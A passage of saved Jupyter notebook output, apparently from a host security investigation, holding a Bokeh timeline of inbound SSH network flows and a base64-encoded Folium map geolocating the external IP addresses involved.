,10,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168],\"y_index\":[2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2]},\"selected\":{\"id\":\"1073\",\"type\":\"Selection\"},\"selection_policy\":{\"id\":\"1072\",\"type\":\"UnionRenderers\"}},\"id\":\"1002\",\"type\":\"ColumnDataSource\"},{\"attributes\":{},\"id\":\"1025\",\"type\":\"PanTool\"},{\"attributes\":{},\"id\":\"1075\",\"type\":\"Selection\"},{\"attributes\":{},\"id\":\"1076\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.5},\"fill_color\":{\"value\":\"green\"},\"line_alpha\":{\"value\":0.5},\"line_color\":{\"value\":\"green\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"FlowStartTime\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1046\",\"type\":\"Circle\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"1069\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"callback\":null},\"id\":\"1007\",\"type\":\"DataRange1d\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"1037\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{},\"id\":\"1074\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"formatter\":{\"id\":\"1059\",\"type\":\"BasicTickFormatter\"},\"plot\":{\"id\":\"1005\",\"subtype\":\"Figure\",\"type\":\"Plot\"},\"ticker\":{\"id\":\"1021\",\"type\":\"BasicTicker\"},\"visible\":false},\"id\":\"1020\",\"type\":\"LinearAxis\"},{\"attributes\":{\"plot\":{\"id\":\"1005\",\"subtype\":\"Figure\",\"type\":\"Plot\"},\"ticker\":{\"id\":\"1016\",\"type\":\"DatetimeTicker\"}},\"id\":\"1019\",\"type\":\"Grid\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"1068\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"bottom_units\":\"screen\",\"fill_alpha\":{\"value\":0.5},\"fill_color\":{\"value\":\"lightgrey\"},\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":{\"value\":1.0},\"line_color\":{\"value\":\"black\"},\"line_dash\":[4,4],\"line_width\":{\"value\":2},\"plot\":null,\"render_mode\":\"css\",\"right_units\":\"screen\",\"top_units\":\"screen\"},\"id\":\"1032\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"#1f77b4\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1052\",\"type\":\"Line\"},{\"attributes\":{\"callback\":null,\"data\":{\"AllExtIPs\":[\"23.97.60.214\",\"23.97.60.214\",\"23.97.60.214\",\"13.67.35.176\",\"13.67.35.176\"],\"FlowDirection\":[\"I\",\"I\",\"I\",\"I\",\"I\"],\"FlowStartTime\":{\"__ndarray__\":\"AID/rlOPdkIAgEdiSY92QgCAPj1Fj3ZCAIDXyDSPdkIAgJ3wKI92Qg==\",\"dtype\":\"float64\",\"shape\":[5]},\"FlowType\":[\"InterVNet\",\"InterVNet\",\"InterVNet\",\"InterVNet\",\"InterVNet\"],\"L7Protocol\":[\"ssh\",\"ssh\",\"ssh\",\"ssh\",\"ssh\"],\"index\":[11,47,73,108,144],\"y_index\":[1,1,1,1,1]},\"selected\":{\"id\":\"1075\",\"type\":\"Selection\"},\"selection_policy\":{\"id\":\"1074\",\"type\":\"UnionRenderers\"}},\"id\":\"1044\",\"type\":\"ColumnDataSource\"},{\"attributes\":{},\"id\":\"1072\",\"type\":\"UnionRenderers\"},{\"attributes\":{},\"id\":\"1011\",\"type\":\"LinearScale\"},{\"attributes\":{\"callback\":null,\"data\":{\"x\":[1550287434000.0,1550287434000.0],\"y\":[0,3]},\"selected\":{\"id\":\"1077\",\"type\":\"Selection\"},\"selection_policy\":{\"id\":\"1076\",\"type\":\"UnionRenderers\"}},\"id\":\"1050\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"1067\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"1061\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{},\"id\":\"1073\",\"type\":\"Selection\"},{\"attributes\":{\"data_source\":{\"id\":\"1002\",\"type\":\"ColumnDataSource\"},\"glyph\":{\"id\":\"1040\",\"type\":\"Circle\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1041\",\"type\":\"Circle\"},\"selection_glyph\":null,\"view\":{\"id\":\"1043\",\"type\":\"CDSView\"}},\"id\":\"1042\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#1f77b4\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"#1f77b4\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"FlowStartTime\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1041\",\"type\":\"Circle\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"1060\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"1066\",\"type\":\"DaysTicker\"},{\"attributes\":{\"callback\":null,\"formatters\":{\"Tooltip\":\"printf\"},\"tooltips\":[[\"FlowType\",\"@FlowType\"],[\"AllExtIPs\",\"@AllExtIPs\"],[\"L7Protocol\",\"@L7Protocol\"],[\"FlowDirection\",\"@FlowDirection\"]]},\"id\":\"1003\",\"type\":\"HoverTool\"},{\"attributes\":{\"data_source\":{\"id\":\"1044\",\"type\":\"ColumnDataSource\"},\"glyph\":{\"id\":\"1046\",\"type\":\"Circle\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1047\",\"type\":\"Circle\"},\"selection_glyph\":null,\"view\":{\"id\":\"1049\",\"type\":\"CDSView\"}},\"id\":\"1048\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"plot\":null,\"text\":\"Timeline Network Flows (out=blue, in=green)\"},\"id\":\"1004\",\"type\":\"Title\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"1062\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#1f77b4\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"#1f77b4\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"FlowStartTime\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1047\",\"type\":\"Circle\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"1065\",\"type\":\"DaysTicker\"},{\"attributes\":{\"data_source\":{\"id\":\"1050\",\"type\":\"ColumnDataSource\"},\"glyph\":{\"id\":\"1051\",\"type\":\"Line\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1052\",\"type\":\"Line\"},\"selection_glyph\":null,\"view\":{\"id\":\"1054\",\"type\":\"CDSView\"}},\"id\":\"1053\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"id\":\"1060\",\"type\":\"AdaptiveTicker\"},{\"id\":\"1061\",\"type\":\"AdaptiveTicker\"},{\"id\":\"1062\",\"type\":\"AdaptiveTicker\"},{\"id\":\"1063\",\"type\":\"DaysTicker\"},{\"id\":\"1064\",\"type\":\"DaysTicker\"},{\"id\":\"1065\",\"type\":\"DaysTicker\"},{\"id\":\"1066\",\"type\":\"DaysTicker\"},{\"id\":\"1067\",\"type\":\"MonthsTicker\"},{\"id\":\"1068\",\"type\":\"MonthsTicker\"},{\"id\":\"1069\",\"type\":\"MonthsTicker\"},{\"id\":\"1070\",\"type\":\"MonthsTicker\"},{\"id\":\"1071\",\"type\":\"YearsTicker\"}]},\"id\":\"1016\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"callback\":null},\"id\":\"1009\",\"type\":\"DataRange1d\"},{\"attributes\":{},\"id\":\"1013\",\"type\":\"LinearScale\"},{\"attributes\":{\"source\":{\"id\":\"1044\",\"type\":\"ColumnDataSource\"}},\"id\":\"1049\",\"type\":\"CDSView\"},{\"attributes\":{\"overlay\":{\"id\":\"1032\",\"type\":\"BoxAnnotation\"}},\"id\":\"1027\",\"type\":\"BoxZoomTool\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"1064\",\"type\":\"DaysTicker\"},{\"attributes\":{\"source\":{\"id\":\"1002\",\"type\":\"ColumnDataSource\"}},\"id\":\"1043\",\"type\":\"CDSView\"},{\"attributes\":{\"line_color\":\"#1f77b4\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1051\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"1059\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":null,\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"1003\",\"type\":\"HoverTool\"},{\"id\":\"1025\",\"type\":\"PanTool\"},{\"id\":\"1026\",\"type\":\"WheelZoomTool\"},{\"id\":\"1027\",\"type\":\"BoxZoomTool\"},{\"id\":\"1028\",\"type\":\"ResetTool\"}]},\"id\":\"1029\",\"type\":\"Toolbar\"},{\"attributes\":{},\"id\":\"1077\",\"type\":\"Selection\"}],\"root_ids\":[\"1005\"]},\"title\":\"Bokeh Application\",\"version\":\"1.0.4\"}};\n",
       "  var render_items = [{\"docid\":\"773e9bd7-cb52-4c65-94e3-e77bba77e328\",\"roots\":{\"1005\":\"a658b4c5-30c8-4ec7-821d-71b10d1d74f9\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    var attempts = 0;\n",
       "    var timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        embed_document(root);\n",
       "        clearInterval(timer);\n",
       "      }\n",
       "      attempts++;\n",
       "      if (attempts > 100) {\n",
       "        console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        clearInterval(timer);\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "1005"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "### GeoLocation Mapping for external IPs"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<h3>External IP Addresses communicating with host</h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Numbered circles indicate multiple items - click to expand"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Location markers: Blue = outbound, Purple = inbound, Green = Host"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div style=\"width:100%;\"><div style=\"position:relative;width:100%;height:0;padding-bottom:60%;\"><iframe src=\"data:text/html;charset=utf-8;base64,PCFET0NUWVBFIGh0bWw+CjxoZWFkPiAgICAKICAgIDxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04IiAvPgogICAgPHNjcmlwdD5MX1BSRUZFUl9DQU5WQVM9ZmFsc2U7IExfTk9fVE9VQ0g9ZmFsc2U7IExfRElTQUJMRV8zRD1mYWxzZTs8L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2xlYWZsZXRAMS4zLjQvZGlzdC9sZWFmbGV0LmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8xLjExLjEvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvMy4yLjAvanMvYm9vdHN0cmFwLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvTGVhZmxldC5hd2Vzb21lLW1hcmtlcnMvMi4wLjIvbGVhZmxldC5hd2Vzb21lLW1hcmtlcnMuanMiPjwvc2NyaXB0PgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2xlYWZsZXRAMS4zLjQvZGlzdC9sZWFmbGV0LmNzcyIvPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC8zLjIuMC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiLz4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvMy4yLjAvY3NzL2Jvb3RzdHJhcC10aGVtZS5taW4uY3NzIi8+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vZm9udC1hd2Vzb21lLzQuNi4zL2Nzcy9mb250LWF3ZXNvbWUubWluLmNzcyIvPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9MZWFmbGV0LmF3ZXNvbWUtbWFya2Vycy8yLjAuMi9sZWFmbGV0LmF3ZXNvbWUtbWFya2Vycy5jc3MiLz4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9yYXdjZG4uZ2l0aGFjay5jb20vcHl0aG9uLXZpc3VhbGl6YXRpb24vZm9saXVtL21hc3Rlci9mb2xpdW0vdGVtcGxhdGVzL2xlYWZsZXQuYXdlc29tZS5yb3RhdGUuY3NzIi8+CiAgICA8c3R5bGU+aHRtbCwgYm9keSB7d2lkdGg6IDEwMCU7aGVpZ2h0OiAxMDAlO21hcmdpbjogMDtwYWRkaW5nOiAwO308L3N0eWxlPgogICAgPHN0eWxlPiNtYXAge3Bvc2l0aW9uOmFic29sdXRlO3RvcDowO2JvdHRvbTowO3JpZ2h0OjA7bGVmdDowO308L3N0eWxlPgogICAgCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLAogICAgICAgIGluaXRpYWwtc2NhbGU9MS4wLCBtYXhpbXVtLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT1ubyIgLz4KICAgIDxzdHlsZT4jbWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1IHsKICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICAgICAgd2lkdGg6IDEwMC4wJTsKICAgICAgICBoZWlnaHQ6IDEwMC4wJTsKICAgICAgICBsZWZ0OiAwLjAlOwogICAgICAgIHRvcDogMC4wJTsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PiAgICAKICAgIAogICAgPGRpdiBjbGFzcz0iZm9saXVtLW1hcCIgaWQ9Im1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSIgPjwvZGl2Pgo8L2JvZHk+CjxzY3JpcHQ+ICAgIAogICAgCiAgICAKICAgICAgICB2YXIgYm91bmRzID0gbnVsbDsKICAgIAoKICAgIHZhciBtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUgPSBMLm1hcCgKICAgICAgICAnbWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1JywgewogICAgICAgIGNlbnRlcjogWzAsIDBdLAogICAgICAgIHpvb206IDEsCiAgICAgICAgbWF4Qm91bmRzOiBib3VuZHMsCiAgICAgICAgbGF5ZXJzOiBbXSwKICAgICAgICB3b3JsZENvcHlKdW1wOiBmYWxzZSwKICAgICAgICBjcnM6IEwuQ1JTLkVQU0czODU3LAogICAgICAgIHpvb21Db250cm9sOiB0cnVlLAogICAgICAgIH0pOwoKICAgIAogICAgCiAgICB2YXIgdGlsZV9sYXllcl8xNDYyNWNhMzMxMTU0ZmU2OGY3OGE4NmJjYWNhYmU1NSA9IEwudGlsZUxheWVyKAogICAgICAgICdodHRwczovL3tzfS50aWxlLm9wZW5zdHJlZXRtYXAub3JnL3t6fS97eH0ve3l9LnBuZycsCiAgICAgICAgewogICAgICAgICJhdHRyaWJ1dGlvbiI6IG51bGwsCiAgICAgICAgImRldGVjdFJldGluYSI6IGZhbHNlLAogICAgICAgICJtYXhOYXRpdmVab29tIjogMTgsCiAgICAgICAgIm1heFpvb20iOiAxOCwKICAgICAgICAibWluWm9vbSI6IDAsCiAgICAgICAgIm5vV3JhcCI6IGZhbHNlLAogICAgICAgICJvcGFjaXR5IjogMSwKICAgICAgICAic3ViZG9tYWlucyI6ICJhYmMiLAogICAgICAgICJ0bXMiOiBmYWxzZQp9KS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgCiAgICAgICAgdmFyIG1hcmtlcl84MjJlMjNmNjZhNDQ0OWU3YjRhNzc3YjFhYmJiZDRkOSA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9jMDgwYjhkODQzZTk0YzViYjAwYzAzMTZmZDM1ZjFkNiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnZ3JlZW4nLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfODIyZTIzZjY2YTQ0NDllN2I0YTc3N2IxYWJiYmQ0ZDkuc2V0SWNvbihpY29uX2MwODBiOGQ4NDNlOTRjNWJiMDBjMDMxNmZkMzVmMWQ2KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzliYTcxM2QyMmYyNjQ4NWY5NTIyZTc2YmJmODkwOTI0ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfZjA2MTNmNjJlMGFmNDMyZThjNWJlZTM2ODZiNmQzZDUgPSAkKGA8ZGl2IGlkPSJodG1sX2YwNjEzZjYyZTBhZjQzMmU4YzViZWUzNjg2YjZkM2Q1IiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjEwNC4yMTEuMzAuMTwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfOWJhNzEzZDIyZjI2NDg1Zjk1MjJlNzZiYmY4OTA5MjQuc2V0Q29udGVudChodG1sX2YwNjEzZjYyZTBhZjQzMmU4YzViZWUzNjg2YjZkM2Q1KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfODIyZTIzZjY2YTQ0NDllN2I0YTc3N2IxYWJiYmQ0ZDkuYmluZFBvcHVwKHBvcHVwXzliYTcxM2QyMmYyNjQ4NWY5NTIyZTc2YmJmODkwOTI0KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl84MjJlMjNmNjZhNDQ0OWU3YjRhNzc3YjFhYmJiZDRkOS5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfNzBkMGViMTEzMmU3NGU5NmI1OWY2NjcwMjNhMWVmMGMgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fODljMDc5ODViMTBlNDIxNjhkZjU0OTY0NTg5MDU0ZTUgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfNzBkMGViMTEzMmU3NGU5NmI1OWY2NjcwMjNhMWVmMGMuc2V0SWNvbihpY29uXzg5YzA3OTg1YjEwZTQyMTY4ZGY1NDk2NDU4OTA1NGU1KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzg4NzMzNjQxMTg2ZDQ1NWI5NmE3YTNiMTMyMGU4YzBjID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfNGNlMWNmMWVhOTYzNDg0MTg4MjExNDgxMDgwODlmMjMgPSAkKGA8ZGl2IGlkPSJodG1sXzRjZTFjZjFlYTk2MzQ4NDE4ODIxMTQ4MTA4MDg5ZjIzIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjE2OC41MC43OTxicj5wcm90b2NvbD1odHRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF84ODczMzY0MTE4NmQ0NTViOTZhN2EzYjEzMjBlOGMwYy5zZXRDb250ZW50KGh0bWxfNGNlMWNmMWVhOTYzNDg0MTg4MjExNDgxMDgwODlmMjMpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl83MGQwZWIxMTMyZTc0ZTk2YjU5ZjY2NzAyM2ExZWYwYy5iaW5kUG9wdXAocG9wdXBfODg3MzM2NDExODZkNDU1Yjk2YTdhM2IxMzIwZThjMGMpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzcwZDBlYjExMzJlNzRlOTZiNTlmNjY3MDIzYTFlZjBjLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFdhc2hpbmd0b24sIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl85OGQ1ODNiNGIyZDE0MjFmOGY4MmEzMGVhYzcwNmNkZSA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl84YzNmMWFhNWYxYzg0ZjI0OWUzOTFlOTU2ODgyODQ2ZCA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl85OGQ1ODNiNGIyZDE0MjFmOGY4MmEzMGVhYzcwNmNkZS5zZXRJY29uKGljb25fOGMzZjFhYTVmMWM4NGYyNDllMzkxZTk1Njg4Mjg0NmQpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfMjU0NTdlNGM5YTI4NGQ2Y2ExMmMxOWY3YjNmZTc0MzMgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9iN2ExNjU5MzgzZjY0MGIzOWVhM2VkOTRmY2YwNTE3ZiA9ICQoYDxkaXYgaWQ9Imh0bWxfYjdhMTY1OTM4M2Y2NDBiMzllYTNlZDk0ZmNmMDUxN2YiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3